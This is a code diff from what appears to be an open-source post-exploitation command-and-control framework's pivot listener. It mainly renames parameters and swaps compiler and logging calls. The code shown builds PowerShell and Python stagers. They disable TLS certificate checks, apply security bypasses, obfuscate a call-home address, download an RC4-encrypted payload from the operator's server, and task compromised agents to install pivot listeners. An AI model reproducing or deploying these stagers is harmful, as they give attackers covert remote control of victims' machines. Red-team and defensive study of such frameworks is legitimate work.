@@ -86,13 +86,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         bypasses: list[str] | None = None,
     ):
         """
@@ -120,7 +120,7 @@ class Listener:
             # PowerShell
 
             stager = '$ErrorActionPreference = "SilentlyContinue";'
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
                 for bypass in bypasses:
@@ -129,17 +129,17 @@ class Listener:
 
             stager += "$wc=New-Object System.Net.WebClient;"
 
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
-            stager += f"$u='{ userAgent }';"
+                user_agent = profile.split("|")[1]
+            stager += f"$u='{user_agent}';"
 
             if "https" in host:
                 # allow for self-signed certificates for https connections
                 stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
-            if userAgent.lower() != "none" or proxy.lower() != "none":
-                if userAgent.lower() != "none":
+            if user_agent.lower() != "none" or proxy.lower() != "none":
+                if user_agent.lower() != "none":
                     stager += "$wc.Headers.Add('User-Agent',$u);"
 
                 if proxy.lower() != "none":
@@ -148,18 +148,16 @@ class Listener:
 
                     else:
                         # TODO: implement form for other proxy
-                        stager += (
-                            f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');"
-                        )
+                        stager += f"$proxy=New-Object Net.WebProxy('{proxy.lower()}');"
                         stager += "$wc.Proxy = $proxy;"
 
-                    if proxyCreds.lower() == "default":
+                    if proxy_creds.lower() == "default":
                         stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                     else:
                         # TODO: implement form for other proxy credentials
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         if len(username.split("\\")) > 1:
                             usr = username.split("\\")[1]
                             domain = username.split("\\")[0]
@@ -186,7 +184,7 @@ class Listener:
                     host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
 
             # code to turn the key string into a byte array
-            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ stagingKey }');"
+            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
 
             # this is the minimized RC4 stager code from rc4.ps1
             stager += listener_util.powershell_rc4()
@@ -203,7 +201,7 @@ class Listener:
             b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")
 
             # stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
-            stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';$hop='{listenerName}';"
+            stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';$hop='{listener_name}';"
 
             # Add custom headers if any
             if customHeaders != []:
@@ -253,18 +251,18 @@ class Listener:
                 launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
             try:
-                if safeChecks.lower() == "true":
+                if safe_checks.lower() == "true":
                     launcherBase += listener_util.python_safe_checks()
             except Exception as e:
-                p = f"{listenerName}: Error setting LittleSnitch in stager: {e!s}"
+                p = f"{listener_name}: Error setting LittleSnitch in stager: {e!s}"
                 log.error(p, exc_info=True)
 
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
+                user_agent = profile.split("|")[1]
 
             launcherBase += "import urllib.request;\n"
-            launcherBase += f"UA='{userAgent}';"
+            launcherBase += f"UA='{user_agent}';"
             launcherBase += f"server='{host}';t='{stage0}';"
 
             # prebuild the request routing packet for the launcher
@@ -306,13 +304,13 @@ class Listener:
                         + "'});\n"
                     )
 
-                if proxyCreds != "none":
-                    if proxyCreds == "default":
+                if proxy_creds != "none":
+                    if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
                     else:
                         launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         launcherBase += (
                             "proxy_auth_handler.add_password(None,'"
                             + proxy
@@ -372,14 +370,9 @@ class Listener:
                 .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
             )
 
-            compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
-            if compiler.status != "ON":
-                self.instance_log.error(
-                    f"{listenerName} csharpserver plugin not running"
-                )
-                return None
-
-            return compiler.do_send_stager(stager_yaml, "Sharpire", confuse=obfuscate)
+            return self.mainMenu.dotnet_compiler.compile_stager(
+                stager_yaml, "Sharpire", confuse=obfuscate
+            )
 
         log.error(
             "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
@@ -816,7 +809,7 @@ class Listener:
                     self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
 
                     msg = "Tasked agent to install Pivot listener "
-                    self.mainMenu.agents.save_agent_log(
+                    self.mainMenu.agentsv2.save_agent_log(
                         tempOptions["Agent"]["Value"], msg
                     )
 
@@ -927,7 +920,7 @@ class Listener:
 
                 self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
                 msg = "Tasked agent to uninstall Pivot listener "
-                self.mainMenu.agents.save_agent_log(agent.session_id, msg)
+                self.mainMenu.agentsv2.save_agent_log(agent.session_id, msg)
 
             elif agent.language.startswith("py"):
                 log.error("Shutdown not implemented for python")
